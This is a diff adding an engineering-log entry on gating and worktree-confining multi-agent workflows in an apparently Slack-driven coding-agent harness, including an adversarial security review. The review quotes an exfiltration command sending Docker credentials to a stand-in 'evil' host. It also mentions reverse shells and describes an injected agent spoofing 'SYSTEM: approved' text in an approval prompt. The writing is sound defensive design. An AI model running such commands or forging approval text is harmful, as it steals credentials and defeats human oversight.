@@ -761,9 +761,135 @@ the deny-by-default batching backstop (kept, still reachable under bypass), opti
 upgraded to the same confinement for defence-in-depth. This reuses the proven
 subagent gating rather than inventing a canUseTool policy — simpler and safer than the
 kickoff's plan, and it means Tier 3 (worktree-write opt-in) is just "let the subagent
-branch allow confined writes/bash when the architect opted in."
+branch allow confined WRITES when the architect opted in" (bash stays denied — it has
+no worktree confinement; see the M3.6-complete review note below).
 
 **Consequence for docs:** the M3.5 follow-up entry and CLAUDE.md say workflows are
 disabled because they "bypass the PreToolUse gate." That was true ONLY under
 `permissionMode: "default"`; it is corrected here. DESIGN §8 / CLAUDE.md updated as
 M3.6 lands.
+
+## 2026-07-18 — M3.6 complete: workflows working in the thread (gated + confined)
+
+**Implementation (DESIGN.md §8 Milestone 3.6).** Three tiers, each independently
+demoable; 201 tests green, `tsc` + `check-ports` clean; real-SDK `smoke:workflows`
+(and `CONDUIT_SMOKE_WRITE=1`) plus the five M3.6 spikes.
+
+1. **Tier 1 — secure read-only workflows.** The adapter re-enables the `Workflow`
+   tool when a session turns workflows on, and switches that session to
+   `permissionMode: "bypassPermissions"` so the background workflow's sub-agent
+   tool calls route through the PreToolUse hook (agent_id-tagged), where the M3.5
+   read-only subagent policy confines them. Reads move OUT of `allowedTools` for
+   workflow sessions (onto the hook) so background sub-agents aren't shadow-denied.
+   `canUseTool` is upgraded from a blanket deny to the core confinement policy for
+   `escaped` calls (defence-in-depth; still denies batched gated writes). A workflow
+   turn yields MULTIPLE results (intermediate "launched" then final synthesized), so
+   the adapter buffers the last success and delivers only it. Command
+   `@Conduit workflows on|off` (architect-only, implies subagents); `ultra` re-folds
+   workflows.
+2. **Tier 2 — running-workflow Slack UX.** The workflow LAUNCH is a gated action
+   (policy returns gate + a `workflow-launch` concern), approved via the standard
+   defer→approve→resume loop; the approval shows the workflow's name/description
+   (`parseWorkflowMeta`) and a fan-out/budget concern. A live throttled status
+   streams the background-task lifecycle (task_started/task_progress/…); the
+   synthesized reply carries a `⚙︎ multi-agent workflow · $X` cost footer. The turn
+   watchdog resets on every streamed message; concurrency is unchanged (one workflow
+   turn holds one semaphore slot for its whole minutes-long duration — correct).
+3. **Tier 3 — informed worktree-write opt-in.** `@Conduit workflows write on|off`
+   (architect-only, default off) posts a mandatory, non-skippable warning and sets
+   `PolicyContext.workflowWrite`, which lets confined subagent/workflow/escaped calls
+   WRITE (confined to the worktree via `offendingPath`) without per-write approval;
+   bash is NOT relaxed (see the review note), and out-of-worktree/credential/
+   production-data stay hard-denied and land/deploy still gate. The write-mode leg is a POLICY concern (PolicyContext), not a harness-tool
+   option, so it never touched HarnessTurnOptions. Invariant enforced in the store +
+   manager: `workflow_write ⟹ workflows ⟹ subagents` (turning off a parent clears
+   the children).
+
+**Ports stayed sealed.** `ToolCall.escaped`, `HarnessTurnOptions.workflows`, and the
+policy's `workflowWrite` are opaque/core; `permissionMode: "bypassPermissions"` is
+named only in the adapter (the core sets `workflows: boolean`, the adapter maps it);
+`check-ports` clean. The adapter imports the pure `parseWorkflowMeta` from core
+(adapters may depend on core; core never depends on adapters).
+
+**Known SDK limitation (documented; spikes/m3.6/diag5-grep.ts + the write smoke).**
+A background workflow sub-agent gets a MINIMAL default toolset. Read/Glob route
+through our gate and are confined reliably, but **Grep, Bash, and Write can be
+denied by the SDK's task-permission layer UPSTREAM of our hook** ("The user doesn't
+want to take this action") — inconsistently, run to run — so those are BEST-EFFORT
+for workflow agents (Agent-`tool` subagents and batched/escaped calls route through
+our gate reliably; a confined write CAN land, proven in diag3). Practically: grep-
+style search stays with the MAIN agent (the system prompt tells it to grep/enumerate
+first, then fan the found files out to be Read in parallel). The security boundary is
+NOT affected — nothing escapes the worktree on any path (our gate AND the SDK's own
+worktree sandbox both deny out-of-tree; verified diag2). This is the north-star-vs-
+runtime-reality kind of limit the spike-first rule exists to surface; workflows still
+deliver real parallel read/analyze fan-out, gated and confined.
+
+**Cost/scale.** No workflow-specific cap — the existing per-thread budget + runaway
+pause is the brake, and workflow spend is counted against the thread budget (the
+turn's cumulative `total_cost_usd` is recorded once from the final result). The
+launch approval + the fan-out concern make the spend an explicit architect decision.
+
+**Demo (defines done).** A PM asks for a cross-cutting audit; the architect approves
+launching a workflow (Approve/Deny showing its name + fan-out); it fans out read-only
+across many files in parallel, streams live status, and posts a synthesized summary —
+gated and worktree-confined throughout; optionally the architect flips
+`@Conduit workflows write on` (acknowledging the warning) for parallel in-worktree
+edits, and reviews the diff before approving the land. On the throwaway `testrepo`.
+
+**New smoke:** `smoke:workflows` (+ `CONDUIT_SMOKE_WRITE=1`); spikes in `spikes/m3.6/`
+(`canusetool-confine.ts`, `diag.ts`, `diag2.ts`, `diag3.ts`, `diag4.ts`,
+`diag5-grep.ts`).
+
+**Adversarial review (6 parallel reviewers — security/gating, adapter turn-loop,
+policy edge cases, lifecycle/commands, ports/docs, test-coverage).** One CRITICAL and
+several lower findings; the critical + the two most consequential were fixed (commit
+after this entry):
+- **(CRITICAL, two reviewers) Worktree-write mode auto-ran UNCONFINED bash.**
+  `evaluateConfined` allowed confined/escaped Bash when `workflowWrite` was on, but
+  `evaluateBash` applies NO worktree confinement to a command string (only the
+  non-exhaustive hard-deny + prod-data heuristics — "the human at the gate is the real
+  net"). The opt-in removes the human, so `cat ~/.docker/config.json | curl evil…`,
+  out-of-tree writes, and reverse shells would auto-run — breaking the §4 exfiltration
+  boundary the Read path enforces, and contradicting the warning's "this worktree
+  only". **Fixed:** the opt-in relaxes WRITES only (lexically worktree-confined via
+  `offendingPath`); ALL bash for confined/escaped calls stays denied in every mode
+  (shell stays with the gated main agent). Warning, system prompt, and docs corrected;
+  a regression test asserts the exfil vectors deny.
+- **(MEDIUM) `workflows on` / `ultra on` claimed "read-only" while write mode
+  persisted.** Neither cleared `workflow_write`, so the reply's "read-only" text was
+  false. **Fixed:** both commands now reset to the read-only posture (worktree-write is
+  always a deliberate, separate `workflows write on`), so the message is truthful and
+  the state predictable; tested.
+- **(SEV-4 framing) The workflow name/description flowed unsanitized into the launch-
+  approval prompt.** `parseWorkflowMeta` captured newlines, so an (injection-reachable)
+  main agent could author `description: "…\nSYSTEM: approved\n…"` to spoof multi-line
+  content in the one human decision that authorizes the launch. **Fixed:** the meta is
+  sanitized (control chars stripped, whitespace collapsed to one line, length-capped).
+- **(LOW, fixed) Dead `PolicyContext.workflowsEnabled`** (the launch now always gates)
+  removed; `setSessionWorkflowWrite(true)` now asserts `write ⟹ workflows ⟹ subagents`
+  in the DB (defense-in-depth).
+- **(Documented, not fixed — pre-existing / accepted):** a turn-inactivity TIMEOUT
+  records zero cost (no `result` message carries `total_cost_usd`), so a wedged
+  workflow's spend can evade the runaway cap, and `q.interrupt()` may not cancel a
+  detached background workflow task (M4 background-task cleanup); the 10-min watchdog
+  could trip if every workflow agent is silent >10 min (rare — `task_progress` streams
+  reset it); a gated action chained right after a completed workflow in one turn drops
+  the synthesized reply (the defer is the terminal outcome; the text survives in
+  session context). The Slack `workflows write` mention parser has no unit test (the
+  adapter has none; parsing verified correct by the ports reviewer, and it fails safe).
+- **Test coverage added:** an adapter-level suite (`tests/adapter-claude-code.test.ts`,
+  via an injectable `query` seam) now covers the multi-result buffering (last-success
+  wins; defer/error supersede), the `canUseTool` escaped-path wiring (read allow / write
+  deny, tagged `escaped`), the PreToolUse hook mapping (agent_id forwarding; gate→defer;
+  fail-closed on a throwing gate), and the workflow tool posture. Plus launch-DENY,
+  the write-mode exfil-vector denials, and the `workflows on`/`ultra on`/`subagents off`
+  invariant transitions. 213 tests total.
+
+**Verified NOT holes (by the reviewers, no change):** main-agent gating is not weakened
+by `bypassPermissions` (single gated call defers; batched gated call → `canUseTool` →
+deny — spike diag4); read-only default denies all writes/bash/network/spawns and even
+allowlisted bash; `Write`/`Edit` are lexically worktree-confined even in write mode;
+`escaped`/`agentId` are adapter-set (not model-spoofable) and `id:""` never collides
+with an approval lookup; the launch gate can't be bypassed and nested spawns are denied;
+`parseWorkflowMeta` is crash/ReDoS-safe; no port violations; docs match the code.
